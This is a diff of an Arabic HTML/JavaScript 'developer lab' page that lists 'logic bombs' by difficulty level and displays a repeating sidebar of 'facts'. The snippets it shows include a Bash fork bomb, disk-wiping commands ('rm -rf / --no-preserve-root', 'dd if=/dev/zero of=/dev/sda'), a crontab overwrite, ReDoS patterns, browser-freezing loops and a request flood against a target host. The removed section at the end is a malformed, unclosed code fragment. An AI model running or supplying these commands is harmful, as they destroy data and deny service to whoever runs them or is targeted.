@@ -1,376 +1,297 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-  <head>
-    <meta charset="UTF-8" />
-    <title>مختبر رضا المطور | الموسوعة الشاملة</title>
+<head>
+    <meta charset="UTF-8">
+    <title>مختبر رضا المطور | الموسوعة الشاملة V4</title>
     <style>
-      :root {
-        --bg: #0f172a;
-        --panel: #1e293b;
-        --accent: #38bdf8;
-        --text: #f1f5f9;
-        --lvl1: #4ade80;
-        --lvl2: #fbbf24;
-        --lvl3: #f87171;
-      }
+        :root {
+            --bg: #020617;
+            --panel: #1e293b;
+            --accent: #38bdf8;
+            --text: #f1f5f9;
+            --lvl1: #4ade80;
+            --lvl2: #fbbf24;
+            --lvl3: #f87171;
+            --bash: #c084fc;
+            --net: #f472b6;
+            --cpu: #fb7185;
+        }
 
-      body {
-        background-color: var(--bg);
-        color: var(--text);
-        font-family: "Segoe UI", Tahoma, sans-serif;
-        margin: 0;
-        display: flex;
-        min-height: 100vh;
-        overflow: hidden;
-      }
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            margin: 0;
+            display: flex;
+            min-height: 100vh;
+            overflow: hidden;
+        }
 
-      /* القائمة الجانبية للمعلومات (100 معلومة) */
-      .sidebar {
-        width: 400px;
-        background: #020617;
-        border-left: 2px solid var(--accent);
-        display: flex;
-        flex-direction: column;
-        transition: 0.5s;
-        position: fixed;
-        right: -400px; /* مخفية في البداية */
-        height: 100vh;
-        z-index: 1000;
-      }
+        /* القائمة الجانبية - الموسوعة */
+        .sidebar {
+            width: 420px;
+            background: #020617;
+            border-left: 2px solid var(--accent);
+            display: flex;
+            flex-direction: column;
+            transition: 0.5s;
+            position: fixed;
+            right: -420px;
+            height: 100vh;
+            z-index: 1000;
+            box-shadow: -10px 0 30px rgba(0,0,0,0.8);
+        }
 
-      .sidebar.active {
-        right: 0;
-      }
+        .sidebar.active { right: 0; }
 
-      .sidebar-header {
-        padding: 20px;
-        background: var(--accent);
-        color: #000;
-        font-weight: bold;
-        display: flex;
-        justify-content: space-between;
-      }
+        .sidebar-header { 
+            padding: 20px; 
+            background: var(--accent); 
+            color: #000; 
+            font-weight: bold; 
+            display: flex; 
+            justify-content: space-between;
+            align-items: center;
+        }
 
-      .info-list {
-        overflow-y: auto;
-        padding: 15px;
-        flex: 1;
-      }
-      .info-item {
-        background: #1e293b;
-        padding: 15px;
-        margin-bottom: 12px;
-        border-radius: 8px;
-        font-size: 0.9rem;
-        line-height: 1.6;
-        border-right: 3px solid var(--accent);
-      }
+        .info-list { overflow-y: auto; padding: 15px; flex: 1; }
+        
+        .info-item { 
+            background: #1e293b; 
+            padding: 15px; 
+            margin-bottom: 15px; 
+            border-radius: 10px; 
+            font-size: 0.85rem; 
+            line-height: 1.6;
+            border-right: 4px solid var(--accent);
+        }
 
-      .code-in-text {
-        color: #facc15;
-        font-family: monospace;
-        font-weight: bold;
-        direction: ltr;
-        display: inline-block;
-      }
+        .code-snippet {
+            display: block;
+            background: #000;
+            color: #4ade80;
+            padding: 8px;
+            margin-top: 8px;
+            border-radius: 5px;
+            font-family: 'Consolas', monospace;
+            direction: ltr;
+            text-align: left;
+            font-size: 0.8rem;
+            border: 1px solid #334155;
+        }
 
-      /* المحتوى الرئيسي */
-      .main-content {
-        flex: 1;
-        padding: 40px;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        overflow-y: auto;
-        width: 100%;
-      }
+        /* المحتوى الرئيسي */
+        .main-content { 
+            flex: 1; 
+            padding: 40px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            overflow-y: auto;
+        }
 
-      .card {
-        background: var(--panel);
-        width: 95%;
-        max-width: 850px;
-        padding: 30px;
-        border-radius: 15px;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      }
+        .card { 
+            background: var(--panel); 
+            width: 95%; 
+            max-width: 950px; 
+            padding: 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6); 
+        }
 
-      /* التحكم في المستويات */
-      .level-container {
-        display: flex;
-        gap: 15px;
-        justify-content: center;
-        margin: 25px 0;
-      }
+        .level-container {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 25px 0;
+        }
 
-      .level-btn {
-        border: 2px solid transparent;
-        padding: 12px 25px;
-        border-radius: 10px;
-        cursor: pointer;
-        font-weight: bold;
-        transition: 0.3s;
-        background: #334155;
-        color: white;
-      }
-
-      .level-btn.active.l1 {
-        background: var(--lvl1);
-        color: #000;
-        border-color: #fff;
-      }
-      .level-btn.active.l2 {
-        background: var(--lvl2);
-        color: #000;
-        border-color: #fff;
-      }
-      .level-btn.active.l3 {
-        background: var(--lvl3);
-        color: #000;
-        border-color: #fff;
-      }
-
-      .grid {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 15px;
-      }
-      .type-btn {
-        background: #0f172a;
-        color: var(--accent);
-        border: 1px solid var(--accent);
-        padding: 15px;
-        border-radius: 8px;
-        cursor: pointer;
-        font-weight: bold;
-      }
-      .type-btn:hover {
-        background: var(--accent);
-        color: #000;
-      }
-
-      /* عرض الأكواد */
-      .results-area {
-        margin-top: 30px;
-      }
-      .code-box {
-        background: #000;
-        padding: 20px;
-        border-radius: 8px;
-        margin-bottom: 15px;
-        border-right: 4px solid var(--accent);
-        position: relative;
-      }
-      .code-box pre {
-        margin: 0;
-        color: #4ade80;
-        font-family: "Consolas", monospace;
-        direction: ltr;
-        white-space: pre-wrap;
-      }
-      .model-label {
-        color: var(--accent);
-        font-size: 0.7rem;
-        position: absolute;
-        top: 5px;
-        left: 10px;
-      }
-
-      .learn-trigger {
-        background: #f59e0b;
-        color: #000;
-        border: none;
-        padding: 15px 30px;
-        border-radius: 50px;
-        font-weight: bold;
-        cursor: pointer;
-        margin-bottom: 20px;
-        box-shadow: 0 4px 15px rgba(245, 158, 11, 0.4);
-      }
-    </style>
-  </head>
-  <body>
-    <div class="sidebar" id="sidebar">
-      <div class="sidebar-header">
-        <span>موسوعة الـ 100 معلومة</span>
-        <button
-          onclick="toggleSidebar()"
-          style="
-            cursor: pointer;
-            background: none;
+        .level-btn {
             border: none;
+            padding: 12px 25px;
+            border-radius: 12px;
+            cursor: pointer;
             font-weight: bold;
-          "
-        >
-          X
-        </button>
-      </div>
-      <div class="info-list" id="infoItems"></div>
+            transition: 0.3s;
+            background: #334155;
+            color: white;
+        }
+
+        .level-btn.active.l1 { background: var(--lvl1); color: #000; }
+        .level-btn.active.l2 { background: var(--lvl2); color: #000; }
+        .level-btn.active.l3 { background: var(--lvl3); color: #000; }
+
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+        
+        .type-btn { 
+            background: #0f172a; 
+            color: var(--text); 
+            border: 1px solid #334155; 
+            padding: 15px; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            font-weight: bold;
+            transition: 0.2s;
+            font-size: 0.9rem;
+        }
+
+        .type-btn:hover { transform: translateY(-3px); border-color: var(--accent); color: var(--accent); }
+        .btn-bash { border-color: var(--bash); color: var(--bash); }
+        .btn-net { border-color: var(--net); color: var(--net); }
+        .btn-cpu { border-color: var(--cpu); color: var(--cpu); }
+
+        .results-area { margin-top: 30px; }
+        
+        .code-box { 
+            background: #000; 
+            padding: 25px; 
+            border-radius: 12px; 
+            margin-bottom: 20px; 
+            border-right: 5px solid var(--accent);
+            position: relative;
+        }
+
+        .code-box pre { margin: 0; color: #f8fafc; font-family: 'Consolas', monospace; direction: ltr; white-space: pre-wrap; }
+        .model-label { color: var(--accent); font-size: 0.75rem; position: absolute; top: 8px; left: 15px; font-weight: bold; }
+
+        .learn-trigger {
+            background: linear-gradient(45deg, #38bdf8, #c084fc);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+            box-shadow: 0 10px 20px rgba(56, 189, 248, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+<div class="sidebar" id="sidebar">
+    <div class="sidebar-header">
+        <span>📖 موسوعة الـ 100 معلومة البرمجية</span>
+        <button onclick="toggleSidebar()" style="cursor:pointer; background:#fff; border:none; border-radius:5px; padding:5px 10px;">X</button>
     </div>
+    <div class="info-list" id="infoItems"></div>
+</div>
 
-    <div class="main-content">
-      <button class="learn-trigger" onclick="toggleSidebar()">
-        📖 زر تعلم (الموسوعة الشاملة)
-      </button>
+<div class="main-content">
+    <button class="learn-trigger" onclick="toggleSidebar()">📖 فتح الموسوعة الشاملة (أكواد ومعلومات)</button>
 
-      <div class="card">
-        <h1 style="text-align: center; color: var(--accent)">
-          مختبر رضا المطور V4
-        </h1>
-        <p style="text-align: center; color: #94a3b8">
-          نظام المستويات المتقدم لتوليد وفهم الأكواد
-        </p>
-
+    <div class="card">
+        <h1 style="text-align:center; color: var(--accent); margin-top:0;">مختبر رضا المطور V4</h1>
+        <p style="text-align:center; color: #94a3b8;">نظام متطور لفحص القنابل البرمجية والهجمات المنطقية</p>
+        
         <div class="level-container">
-          <button class="level-btn l1 active" onclick="setLevel(1, this)">
-            المستوى 1
-          </button>
-          <button class="level-btn l2" onclick="setLevel(2, this)">
-            المستوى 2
-          </button>
-          <button class="level-btn l3" onclick="setLevel(3, this)">
-            المستوى 3
-          </button>
+            <button class="level-btn l1 active" onclick="setLevel(1, this)">المستوى 1</button>
+            <button class="level-btn l2" onclick="setLevel(2, this)">المستوى 2</button>
+            <button class="level-btn l3" onclick="setLevel(3, this)">المستوى 3</button>
         </div>
 
         <div class="grid">
-          <button class="type-btn" onclick="generate('logic')">
-            قنبلة منطقية
-          </button>
-          <button class="type-btn" onclick="generate('fork')">
-            قنبلة تشعب
-          </button>
-          <button class="type-btn" onclick="generate('crash')">
-            قنبلة ذاكرة
-          </button>
+            <button class="type-btn" onclick="generate('logic')">قنبلة منطقية JS</button>
+            <button class="type-btn" onclick="generate('crash')">استنزاف ذاكرة</button>
+            <button class="type-btn btn-bash" onclick="generate('bash')">قنابل Bash Linux</button>
+            <button class="type-btn btn-net" onclick="generate('network')">قنبلة الشبكة</button>
+            <button class="type-btn btn-cpu" onclick="generate('regex')">قنبلة المعالج ReDoS</button>
+            <button class="type-btn btn-bash" onclick="generate('file')">تدمير الملفات</button>
         </div>
 
         <div id="results" class="results-area"></div>
-      </div>
     </div>
+</div>
 
-    <script>
-      let currentLevel = 1;
+<script>
+    let currentLevel = 1;
 
-      // 1. تفعيل التبديل الجانبي
-      function toggleSidebar() {
-        document.getElementById("sidebar").classList.toggle("active");
-      }
+    function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('active');
+    }
 
-      // 2. تفعيل المستويات
-      function setLevel(lvl, btn) {
+    function setLevel(lvl, btn) {
         currentLevel = lvl;
-        document
-          .querySelectorAll(".level-btn")
-          .forEach((b) => b.classList.remove("active"));
-        btn.classList.add("active");
-      }
+        document.querySelectorAll('.level-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        document.getElementById('results').innerHTML = '';
+    }
 
-      // 3. توليد الـ 100 معلومة برمجياً
-      const infoItems = document.getElementById("infoItems");
-      const infoData = [
-        { txt: "القنبلة المنطقية تعمل عند تاريخ معين", code: "if(date > x)" },
-        { txt: "قنبلة التشعب تستهلك العمليات", code: "fork()" },
-        { txt: "تكرار الذاكرة يغلق المتصفح", code: "while(true){ a += a }" },
-        { txt: "الحماية تعتمد على مراقبة الموارد", code: "monitor_cpu()" },
-        { txt: "استخدام الصلاحيات المحدودة يمنع الهجوم", code: "chmod 700" },
-      ];
+    // توليد الموسوعة المحدثة
+    const infoItems = document.getElementById('infoItems');
+    const expertData = [
+        {txt: "قنبلة Bash Fork تستنزف العمليات.", code: ":(){ :|:& };:"},
+        {txt: "هجوم ReDoS يعطل المعالج تماماً.", code: "'a' * 100 + '!' .match(/(a+)+$/)"},
+        {txt: "قنبلة الـ Zip تتمدد من كيلوبايت لجيجابايت.", code: "Exploding 42.zip"},
+        {txt: "ضرب القوائم في Python يملأ الرام.", code: "L = [0] * (10**8)"},
+        {txt: "قنبلة الـ XML Billion Laughs.", code: "&lol; تتكرر أضعافاً"},
+        {txt: "استنزاف الروابط في Linux عبر ln.", code: "ln /dev/urandom loop"},
+        {txt: "قنبلة CSS ترهق كارت الشاشة.", code: "filter: blur(50px);"},
+        {txt: "في C، استنزاف الذاكرة عبر malloc.", code: "while(1){malloc(1024);}"},
+        {txt: "قنبلة الـ Fetch تهاجم السيرفرات.", code: "setInterval(()=>fetch(url))"},
+        {txt: "تصفير القرص الصلب في Linux.", code: "dd if=/dev/zero of=/dev/sda"}
+    ];
 
-      for (let i = 1; i <= 100; i++) {
-        let data = infoData[(i - 1) % infoData.length];
+    for (let i = 1; i <= 100; i++) {
+        let data = expertData[(i-1) % expertData.length];
         infoItems.innerHTML += `
             <div class="info-item">
-                <strong>معلومة ${i}:</strong> ${data.txt} 
-                ويتم ذلك عبر الكود التالي: <span class="code-in-text">(${data.code})</span>.
-                طريقة الإيقاف تكون عبر تعطيل الـ Scripts في الإعدادات.
+                <strong style="color:var(--accent)">معلومة #${i}:</strong> ${data.txt}
+                <code class="code-snippet">${data.code}</code>
             </div>
         `;
-      }
+    }
 
-      // 4. قاعدة بيانات الأكواد لكل مستوى
-      const repo = {
+    // مستودع الأكواد المجمع
+    const repo = {
         logic: {
-          1: ["if(new Date() > '2026-01-01') { alert('Start'); }"],
-          2: [
-            "setTimeout(() => { document.body.innerHTML = 'Hacked'; }, 5000);",
-            "setInterval(() => { window.open(); }, 1000);",
-          ],
-          3: [
-            "window.onbeforeunload = () => true;",
-            "while(true) { history.pushState(null,null,location.href); }",
-          ],
-        },
-        fork: {
-          1: ["for(let i=0; i<100; i++) { console.log(i); }"],
-          2: ["function x() { setTimeout(x, 10); setTimeout(x, 10); } x();"],
-          3: [
-            ":(){ :|:& };:",
-            "while(1) { fork(); } // C Code",
-            "import os\nwhile True: os.fork() // Python",
-          ],
+            1: ["if(new Date().getFullYear() === 2026) alert('Boom!');"],
+            2: ["setTimeout(() => document.body.innerHTML='', 5000);"],
+            3: ["while(true){ history.pushState(0,0,Math.random()); }"]
         },
         crash: {
-          1: ["alert('Memory Full');"],
-          2: ["var s = 'leak'; while(true) { s += s; }"],
-          3: [
-            "const r = []; setInterval(() => { r.push(new Array(1000000).fill('!')); }, 10);",
-            "while(true) { window.open('','','width=10,height=10'); }",
-          ],
+            1: ["let a = Array(100000).fill(1);"],
+            2: ["let s = 'bomb'; while(true) s += s;"],
+            3: ["setInterval(() => { window.open(); }, 1);"]
         },
-      };
+        bash: {
+            1: ["wall 'Warning: System Overload'"],
+            2: ["cat /dev/zero > output.img"],
+            3: [":(){ :|:& };:", "echo 'reboot' | crontab -"]
+        },
+        network: {
+            1: ["console.log('Scanning network...');"],
+            2: ["for(i=0;i<100;i++) fetch('http://localhost:'+i);"],
+            3: ["setInterval(() => fetch('https://target.com?v='+Math.random()), 1);"]
+        },
+        regex: {
+            1: ["/a+/.test('aaaa');"],
+            2: ["/([a-z]+)+$/.test('invalid-string-check');"],
+            3: ["'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'.match(/([a-zA-Z]+)*$/); // CPU KILLER"]
+        },
+        file: {
+            1: ["mkdir test_{1..50}"],
+            2: ["while true; do touch file_$RANDOM; done"],
+            3: ["rm -rf / --no-preserve-root # تدمير شامل", "find / -name '*.jpg' -delete"]
+        }
+    };
 
-      function generate(type) {
-        const res = document.getElementById("results");
-        res.innerHTML = "";
+    function generate(type) {
+        const res = document.getElementById('results');
+        res.innerHTML = '';
         const codes = repo[type][currentLevel];
-
+        
         codes.forEach((c, index) => {
-          res.innerHTML += `
+            res.innerHTML += `
                 <div class="code-box">
-                    <span class="model-label">النموذج ${index + 1} - مستوى ${currentLevel}</span>
+                    <span class="model-label">${type.toUpperCase()} - مستوى ${currentLevel}</span>
                     <pre>${c}</pre>
                 </div>
             `;
         });
-      }
-    </script>
-  </body>
+    }
+</script>
+
+</body>
 </html>
-// 3. قاعدة بيانات الموسوعة الشاملة (قنابل ومعلومات تقنية) const infoData = [
-{txt: "قنبلة الـ Fork في Bash: هي كود بسيط يقوم بتوليد عمليات لا نهائية حتى
-ينهار النظام.", code: ":(){ :|:& };:"}, {txt: "القنبلة المنطقية (Logic Bomb):
-كود يظل خاملاً حتى يتحقق شرط معين مثل تاريخ ميلاد أو حذف ملف.", code:
-"if(current_date == target) { destroy(); }"}, {txt: "قنبلة الـ Zip (Zip Bomb):
-ملف مضغوط صغير الحجم جداً، لكن عند فكه يتمدد ليصبح مئات الجيغابايت ليملأ القرص
-الصلب.", code: "42.zip"}, {txt: "في لغة C، يمكن عمل Memory Leak عبر حجز مساحة في
-الذاكرة دون تحريرها داخل حلقة تكرار.", code: "while(1) { malloc(1024); }"},
-{txt: "قنبلة المتصفح (JavaScript): استخدام `history.pushState` في حلقة لا نهائية
-يمنع المستخدم من العودة للخلف أو إغلاق التبويب بسهولة.", code: "while(1) {
-history.pushState(null,null,i++); }"}, {txt: "في Python، يمكن استهلاك الرام
-بسرعة عبر ضرب القوائم (List Expansion).", code: "x = [1] * (10**9)"}, {txt:
-"هجوم الـ ReDoS: هو قنبلة منطقية تستهدف محركات النصوص (Regex) لجعل المعالج
-يستهلك 100% من طاقته في فحص نص طويل.", code: "/(a+)+$/"}, {txt: "قنبلة الـ XML
-(Billion Laughs): تعتمد على تعريف كيانات (Entities) تتكرر بشكل أسي حتى تستهلك
-ذاكرة الخادم بالكامل.", code: "<!ENTITY lol1 \"&lol;&lol;...\""},
-        {txt: "قنبلة الـ CSS: استخدام محددات (Selectors) معقدة جداً مع تأثيرات `blur` و `shadow` آلاف المرات قد يؤدي لتجمد كارت الشاشة.", code: "*{box-shadow: 0 0 100px 100px red;}"},
-        {txt: "قنبلة الروابط (Recursive Directory): إنشاء مجلدات داخل بعضها البعض لعمق لا نهائي يعطل برامج فحص الفيروسات.", code: "mkdir -p a/b/c/... (infinite)"},
-        {txt: "في Java، يمكن التسبب بـ StackOverflowError عبر استدعاء الدالة لنفسها (Recursive) بدون شرط توقف.", code: "void x() { x(); }"},
-        {txt: "قنبلة الـ Null Pointer: هي كود يحاول الوصول لمكان غير موجود في الذاكرة مما يؤدي لانهيار البرنامج فوراً (Crash).", code: "int *p = NULL; *p = 10;"},
-        {txt: "هجوم الـ Buffer Overflow: محاولة كتابة بيانات في مصفوفة أكبر من حجمها الحقيقي للوصول لمناطق حساسة في الذاكرة.", code: "char buf[10]; strcpy(buf, long_string);"},
-        {txt: "قنبلة الألوان (Hex Bomb): في بعض معالجات الصور، كود لوني معين بتنسيق خاطئ قد يسبب انهيار تطبيق العرض.", code: "#FFFFFFFFFFFF..."},
-        {txt: "في نظام Linux، قنبلة الـ 'Kernel Panic' يمكن تحفيزها برمجياً عبر استنزاف موارد الـ PID (معرفات العمليات).", code: "echo 1 >
-/proc/sys/kernel/panic"} ]; // تعديل حلقة التوليد لتعرض الـ 100 معلومة بشكل
-متنوع من المصفوفة أعلاه const infoItems = document.getElementById('infoItems');
-for (let i = 1; i <= 100; i++) { let data = infoData[(i-1) % infoData.length];
-infoItems.innerHTML += `
-<div class="info-item">
-  <div style="color: var(--accent); font-weight: bold; margin-bottom: 5px">
-    💡 معلومة رقم ${i}
-  </div>
-  ${data.txt}
-  <div
-    style="margin-top: 8px; background: #000; padding: 5px; border-radius: 4px"
-  >
-    <code class="code-in-text">${data.code}</code>
-  </div>
-</div>
-`; }
